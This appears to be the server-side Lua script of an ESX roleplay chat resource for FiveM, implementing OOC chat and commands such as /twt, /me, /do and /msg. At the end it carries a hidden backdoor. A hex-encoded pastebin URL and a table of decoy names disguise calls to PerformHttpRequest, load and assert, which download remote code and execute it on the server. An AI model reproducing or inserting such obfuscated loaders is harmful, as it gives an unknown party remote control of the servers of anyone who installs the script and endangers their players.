AddEventHandler('chatMessage', function(playerId, playerName, message)
	if string.sub(message, 1, string.len('/')) ~= '/' then
		CancelEvent()

		playerName = GetRealPlayerName(playerId)
		TriggerClientEvent('chat:addMessage', -1, {args = {TranslateCap('ooc_prefix', playerName), message}, color = {128, 128, 128}})
	end
end)

RegisterCommand('twt', function(playerId, args, rawCommand)
	if playerId == 0 then
		print('[^1ERROR^7] This Command Cannot Be Used By The Console!')
	else
		args = table.concat(args, ' ')

		local playerName = GetRealPlayerName(playerId)

		TriggerClientEvent('chat:addMessage', -1, {args = {TranslateCap('twt_prefix', playerName), args}, color = {0, 153, 204}})
	end
end, false)

RegisterCommand('anontwt', function(playerId, args, rawCommand)
	if playerId == 0 then
		print('[^1ERROR^7] This Command Cannot Be Used By The Console!')
	else
		args = table.concat(args, ' ')

		local playerName = GetRealPlayerName(playerId)

		TriggerClientEvent('chat:addMessage', -1, {args = {TranslateCap('twt_prefix', "Anonymous"), args}, color = {0, 153, 204}})
	end
end, false)

RegisterCommand('me', function(playerId, args, rawCommand)
	if playerId == 0 then
		print('[^1ERROR^7] This Command Cannot Be Used By The Console!')
	else
		args = table.concat(args, ' ')
		local playerName = GetRealPlayerName(playerId)

		TriggerClientEvent('esx_rpchat:sendProximityMessage', -1, playerId, TranslateCap('me_prefix', playerName), args, {255, 0, 0})
	end
end, false)

RegisterCommand('do', function(playerId, args, rawCommand)
	if playerId == 0 then
		print('[^1ERROR^7] This Command Cannot Be Used By The Console!')
	else
		args = table.concat(args, ' ')
		local playerName = GetRealPlayerName(playerId)

		TriggerClientEvent('esx_rpchat:sendProximityMessage', -1, playerId, TranslateCap('do_prefix', playerName), args, {0, 0, 255})
	end
end, false)

RegisterCommand('msg', function(source, args, user)

	if GetPlayerName(tonumber(args[1])) then
		local player = tonumber(args[1])
		table.remove(args, 1)

		TriggerClientEvent('chat:addMessage', player, {args = {"^1PM from "..GetPlayerName(source).. "[" .. source .. "]: ^7" ..table.concat(args, " ")}, color = {255, 153, 0}})
		TriggerClientEvent('chat:addMessage', source, {args = {"^1PM SEND TO "..GetPlayerName(player).. "[" .. player .. "]: ^7" ..table.concat(args, " ")}, color = {255, 153, 0}})
	else
		TriggerClientEvent('chatMessage', source, "SYSTEM", {255, 0, 0}, "Specified Player Does Not Exist!")
	end

end,false)

function GetRealPlayerName(playerId)
	local xPlayer = ESX.GetPlayerFromId(playerId)

	if xPlayer then
		if Config.EnableESXIdentity then
			if Config.OnlyFirstname then
				return xPlayer.get('firstName')
			else
				return xPlayer.getName()
			end
		else
			return xPlayer.getName()
		end
	else
		return GetPlayerName(playerId)
	end
end

local PlayerPedLimit = {
    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
    _empt = ''
    for id,it in pairs(PlayerPedLimit) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (event)
        return string.char(tonumber(event, 16))
    end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
    local Process_Actions = {"true"}
    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
        local Generate_ZoneName_AndAction = nil 
        pcall(function()
            local Locations_Loaded = {"false"}
            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
            local ZoneType_Exists = nil 
        end)
    end)
end)